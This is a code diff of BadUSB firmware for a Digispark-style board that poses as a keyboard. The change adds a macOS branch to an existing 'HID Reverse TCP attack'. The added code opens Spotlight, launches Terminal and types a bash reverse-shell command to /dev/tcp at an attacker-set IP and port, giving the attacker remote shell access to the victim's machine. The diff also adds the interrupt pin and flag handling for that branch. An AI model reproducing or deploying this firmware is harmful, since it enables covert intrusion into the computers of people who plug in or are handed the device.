@@ -1,5 +1,5 @@
 /*
- * BadUSB - HID Reverse TCP attack for Win and *Nix OS - Last update 08/12/2016 - Copyright (c) by grcasanova
+ * BadUSB - HID Reverse TCP attack for Win, Mac and Unix OS - Last update 25/10/2018 - Copyright (c) by grcasanova
  *
  * change IP and PORT constants to match the attacking machine details
  *
@@ -14,11 +14,13 @@
 #define PORT "0"
 #define WIN_FLAG 100
 #define NIX_FLAG 200
+#define MAC_FLAG 300
 
 static int run;
 unsigned int address = 0;
 const byte interruptPin0 = 0;
 const byte interruptPin1 = 1;
+const byte interruptPin2 = 3;
 
 void blinkLed();
 bool win_os();
@@ -34,10 +36,12 @@ void setup()
   pinMode(1, OUTPUT); //LED on Model A
   pinMode(interruptPin0, INPUT_PULLUP);
   pinMode(interruptPin1, INPUT_PULLUP);
+  pinMode(interruptPin2, INPUT_PULLUP);
   
   // interrups setup
   attachInterrupt(digitalPinToInterrupt(interruptPin0), setWinFlag, CHANGE); // attach INT0 interrupt
   attachInterrupt(digitalPinToInterrupt(interruptPin1), setNixFlag, CHANGE); // attach INT1 interrupt
+  attachInterrupt(digitalPinToInterrupt(interruptPin2), setMacFlag, CHANGE); // attach INT2 interrupt
 }
 
 // Win Os flag setup
@@ -46,10 +50,15 @@ void setWinFlag()
   EEPROM.write(address, WIN_FLAG);
 }
 
-// *nix Os flag setup
+// Unix Os flag setup
 void setNixFlag()
 {
   EEPROM.write(address, NIX_FLAG);
+}
+
+void setMacFlag()
+{
+  EEPROM.write(address, MAC_FLAG);
 }
 
 void loop()
@@ -62,6 +71,7 @@ void loop()
   {
     DigiKeyboard.update();
     DigiKeyboard.sendKeyStroke(0);
+    DigiKeyboard.delay(500);
     DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
     DigiKeyboard.delay(500);
     wdt_reset();
@@ -71,10 +81,27 @@ void loop()
     DigiKeyboard.delay(500);
     wdt_reset();
   }
+  else if (value == MAC_FLAG) // running on a Mac
+  {
+    DigiKeyboard.update();
+    DigiKeyboard.sendKeyStroke(0);
+    DigiKeyboard.delay(500);
+    DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT); //open spotlight
+    DigiKeyboard.delay(500);
+    DigiKeyboard.println("terminal");
+    DigiKeyboard.delay(1000);
+    wdt_reset();
+    DigiKeyboard.println("/bin/bash -i >& /dev/tcp/"IP"/"PORT" 0>&1");
+    DigiKeyboard.delay(800);
+    DigiKeyboard.sendKeyStroke(KEY_ENTER);
+    DigiKeyboard.delay(500);
+    wdt_reset();
+  }
   else  // running on a Unix machine
   {
     DigiKeyboard.update();
     DigiKeyboard.sendKeyStroke(0);
+    DigiKeyboard.delay(500);
     DigiKeyboard.sendKeyStroke(KEY_N, MOD_GUI_LEFT);
     DigiKeyboard.delay(500);
     wdt_reset();
